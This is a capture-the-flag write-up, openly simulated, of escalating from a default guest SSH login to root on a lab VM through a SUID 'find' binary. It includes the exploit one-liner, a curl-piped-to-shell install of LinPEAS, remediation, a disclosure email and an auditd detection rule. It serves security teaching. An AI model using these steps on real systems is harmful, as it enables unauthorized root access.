# Privilege Escalation Project — Escalator Challenge VM

> **Note:** This is a hypothetical walkthrough created for educational purposes.
> The VM environment was unavailable due to technical issues. All steps, outputs,
> and findings below represent a realistic simulation of the expected exercise.

---

## Table of Contents

1. [Walkthrough](#walkthrough)
2. [Remediation](#remediation)
3. [Vulnerability Report Email](#vulnerability-report-email)
4. [Ethical Hacking Report](#ethical-hacking-report)

---

## Walkthrough

### Phase 1 — IP Discovery

After booting the VM with a Host-Only Adapter network configuration, the first step
was to identify the target machine's IP address on the local network using `arp-scan`:

```bash
sudo arp-scan --localnet
```

**Expected Output:**
```
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9.7 with 256 hosts
192.168.56.1    0a:00:27:00:00:00    (Unknown)
192.168.56.101  08:00:27:ab:cd:ef    PCS Systemtechnik GmbH (VirtualBox)
```

The target IP was identified as **192.168.56.101**.

---

### Phase 2 — Port Scanning & Service Enumeration

A full port scan was conducted using `nmap` to identify open services:

```bash
nmap -sV -sC -p- 192.168.56.101
```

**Expected Output:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp open  http    Apache httpd 2.4.38
```

SSH (port 22) was identified as the primary entry point.

---

### Phase 3 — Initial Access

Default credentials were tested for the `guest` account:

```bash
ssh guest@192.168.56.101
# Password: guest
```

Login was successful. We now had a low-privilege shell as the `guest` user.

```
guest@escalator:~$ id
uid=1001(guest) gid=1001(guest) groups=1001(guest)
```

---

### Phase 4 — Local Enumeration

With a foothold established, the system was enumerated for privilege escalation paths.

**Check sudo permissions:**
```bash
sudo -l
```
Output indicated no direct sudo permissions for the `guest` user.

**Search for SUID binaries:**
```bash
find / -perm -4000 -type f 2>/dev/null
```

**Key finding in output:**
```
/usr/bin/find
/usr/bin/passwd
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
```

The binary `/usr/bin/find` was identified with the **SUID bit set** — this is a
misconfiguration, as `find` does not require elevated privileges to function normally.

**Verify the SUID bit:**
```bash
ls -la /usr/bin/find
```

```
-rwsr-xr-x 1 root root 315904 Feb 16 2019 /usr/bin/find
```

The `s` in the permissions (`rws`) confirms the SUID bit is active, meaning `find`
executes with the file owner's privileges (root) regardless of who runs it.

---

### Phase 5 — Privilege Escalation

Using GTFOBins, the SUID `find` binary was exploited to spawn a root shell:

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

**Explanation of the command:**
- `-exec /bin/sh -p` — executes a shell; the `-p` flag preserves the effective UID (root)
- `\; -quit` — runs once and exits the find loop

**Shell prompt after execution:**
```
# id
uid=1001(guest) gid=1001(guest) euid=0(root) egid=0(root)
```

Root access was confirmed (`euid=0`).

---

### Phase 6 — Flag Retrieval

```bash
cat /root/root.txt
```

```
FLAG{r00t_4cc3ss_gr4nt3d_v14_su1d_m1sc0nf1g}
```

---

## Remediation

### 1. Remove the SUID Bit from `find`

The `find` binary has no legitimate reason to run with root privileges. The SUID bit
should be removed immediately:

```bash
sudo chmod u-s /usr/bin/find
```

Verify the fix:
```bash
ls -la /usr/bin/find
# Expected: -rwxr-xr-x (no 's')
```

### 2. Audit All SUID Binaries Regularly

Run periodic audits to catch unnecessary SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Only the following binaries typically require SUID in a standard Linux system:
`/usr/bin/passwd`, `/usr/bin/sudo`, `/usr/bin/newgrp`, `/usr/bin/chsh`,
`/usr/bin/chfn`, `/bin/su`, `/usr/lib/openssh/ssh-keysign`.

Any others should be reviewed and the SUID bit removed if unnecessary.

### 3. Apply the Principle of Least Privilege

- User accounts should only have the minimum permissions required for their role.
- The `guest` account should have heavily restricted access and should not be able
  to interact with SUID binaries unnecessarily.

### 4. Use Security Auditing Tools

Deploy automated auditing tools to continuously check for misconfigurations:

```bash
# Lynis — system security auditing tool
sudo lynis audit system

# LinPEAS — useful during penetration testing to surface misconfigs
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### 5. Enable AppArmor or SELinux

Mandatory Access Control (MAC) frameworks like **AppArmor** or **SELinux** can
restrict what SUID binaries are permitted to do even if they are misconfigured,
providing an additional layer of defense.

---

## Vulnerability Report Email

```
To: security@escalatorlab.com
Subject: Security Vulnerability Report: Privilege Escalation in Escalator Challenge VM

Dear Security Team,

I am writing to report a privilege escalation vulnerability identified during an
authorized penetration testing exercise conducted on the Escalator Challenge VM.

---

Summary:

An authenticated low-privilege user is able to escalate their privileges to root
due to a misconfigured SUID bit on the /usr/bin/find binary. The SUID bit causes
the binary to execute with root-level effective permissions regardless of which
user invokes it. By leveraging this, an attacker with any valid user account can
spawn an interactive root shell and gain full control of the system.

---

Steps to Reproduce:

1. Connect to the target machine via SSH using low-privilege credentials:
   ssh guest@192.168.56.101
   Password: guest

2. Confirm current user privileges:
   id
   (Expected output: uid=1001(guest) gid=1001(guest))

3. Search for SUID binaries on the system:
   find / -perm -4000 -type f 2>/dev/null

4. Observe that /usr/bin/find has the SUID bit set:
   ls -la /usr/bin/find
   (Expected: -rwsr-xr-x 1 root root ...)

5. Exploit the SUID binary to spawn a root shell using GTFOBins technique:
   /usr/bin/find . -exec /bin/sh -p \; -quit

6. Confirm root access:
   id
   (Expected output: uid=1001(guest) euid=0(root))

7. Retrieve the flag:
   cat /root/root.txt

---

Impact:

If exploited, this vulnerability allows any authenticated user — including those
with minimal system access — to gain full root privileges. The potential impact
includes:

- Complete compromise of system integrity and confidentiality
- Unauthorized access to all files, credentials, and sensitive data on the system
- Ability to install backdoors, create persistent access, or pivot to other systems
- Ability to destroy or tamper with system logs, hiding evidence of the intrusion
- Full lateral movement capability within the network

This vulnerability has a HIGH severity rating and should be remediated immediately.

---

Proof of Root Access:

Root access was successfully obtained and the following flag was retrieved:

  FLAG{r00t_4cc3ss_gr4nt3d_v14_su1d_m1sc0nf1g}

Root shell confirmation:
  # id
  uid=1001(guest) gid=1001(guest) euid=0(root) egid=0(root)
  # cat /root/root.txt
  FLAG{r00t_4cc3ss_gr4nt3d_v14_su1d_m1sc0nf1g}

---

Recommended Fix:

Remove the SUID bit from /usr/bin/find:
  sudo chmod u-s /usr/bin/find

Conduct a full audit of all SUID binaries and apply the principle of least privilege
across all user accounts and system binaries.

Please feel free to reach out for further details or clarification.

Best regards,
Sheila Fana
```

---

## Ethical Hacking Report

### 1. The Importance of Obtaining Proper Authorization

Ethical hacking, also known as penetration testing, is only legal and justifiable
when performed with **explicit written authorization** from the system or
organization owner. Before any security testing begins, a penetration tester must:

- Obtain a signed **Scope of Work** or **Rules of Engagement (RoE)** document
- Clearly define the **scope** — which systems, IP ranges, and services are in scope
- Agree on the **testing window** — when testing may occur
- Establish **emergency contacts** in case testing causes unintended disruption

Without authorization, the same actions performed in this exercise would constitute
unauthorized access under laws such as:
- **Kenya's Computer Misuse and Cybercrimes Act, 2018**
- **The US Computer Fraud and Abuse Act (CFAA)**
- **The UK Computer Misuse Act 1990**
- **The EU Directive on Attacks Against Information Systems**

In this project, the VM environment was provided specifically for educational testing,
constituting the required authorization.

---

### 2. Legal and Ethical Boundaries of Vulnerability Testing

Even with authorization, penetration testers must operate within strict ethical
and legal boundaries:

**Do:**
- Stay strictly within the agreed scope — do not test systems outside the defined targets
- Document every action taken during the assessment for full accountability
- Immediately disclose critical findings to the client as they are discovered
- Use the minimum level of access needed to demonstrate impact
- Treat all data encountered during testing as confidential

**Do Not:**
- Access, exfiltrate, or read personal or sensitive data beyond what is needed to prove the vulnerability
- Damage or disrupt systems — the goal is to demonstrate risk, not to cause harm
- Use findings for personal gain or share them with unauthorized third parties
- Exceed the agreed testing window or scope without written approval

The distinction between an ethical hacker and a malicious attacker is **consent**
and **intent**. The techniques are identical — the authorization and purpose are not.

---

### 3. Responsible Disclosure and Avoiding Harm

Responsible disclosure is the process of reporting a vulnerability to the affected
party in a way that gives them the opportunity to fix it before it becomes public
knowledge. Best practices include:

- **Private notification first:** Report the vulnerability directly and privately to
  the vendor, organization, or security team before disclosing it publicly.
- **Provide sufficient detail:** Include clear reproduction steps, impact assessment,
  and suggested remediation — as demonstrated in the vulnerability report above.
- **Allow reasonable remediation time:** Industry standard is typically 90 days,
  following the precedent set by Google Project Zero.
- **Follow up:** If the organization does not respond or fails to act within the
  agreed timeframe, escalate through appropriate channels (e.g., CERT, CISA).
- **Never weaponize findings:** Do not release working exploit code publicly before
  the vulnerability is patched, as this puts real systems and users at risk.

In bug bounty contexts, platforms like HackerOne and Bugcrowd provide structured
frameworks for responsible disclosure with legal safe harbor protections for
researchers who follow the rules.

---

### 4. Detecting and Preventing Privilege Escalation Attacks

Organizations can defend against privilege escalation attacks through the following
measures:

**Prevention:**
- Regularly audit SUID/SGID binaries and remove unnecessary elevated permissions
- Apply the Principle of Least Privilege — users and processes get only the access they need
- Keep systems patched and up to date to eliminate known vulnerabilities
- Use mandatory access control frameworks (AppArmor, SELinux) to limit what processes can do
- Enforce strong credential policies and rotate default passwords

**Detection:**
- Monitor for unusual use of SUID binaries via system call auditing (e.g., `auditd`)
- Alert on unexpected privilege changes using SIEM tools (e.g., Splunk, Wazuh)
- Log and monitor all SSH logins, especially from non-standard accounts
- Use file integrity monitoring (FIM) tools like AIDE or Tripwire to detect changes
  to sensitive binaries and configuration files
- Deploy EDR (Endpoint Detection and Response) solutions to identify anomalous
  process behavior, such as a shell spawned by `find`

**Example auditd rule to detect SUID abuse:**
```bash
auditctl -a always,exit -F arch=b64 -S execve -F euid=0 -F auid>=1000 \
  -F auid!=4294967295 -k privilege_escalation
```

This logs any process that executes with root effective UID (euid=0) but was
launched by a normal user account (auid >= 1000), which is exactly the pattern
produced by the SUID `find` exploit demonstrated in this project.
```

---

*This document was prepared for educational purposes as part of an authorized
penetration testing exercise. All testing was conducted within the provided
VM environment only. No real systems were accessed or harmed.*
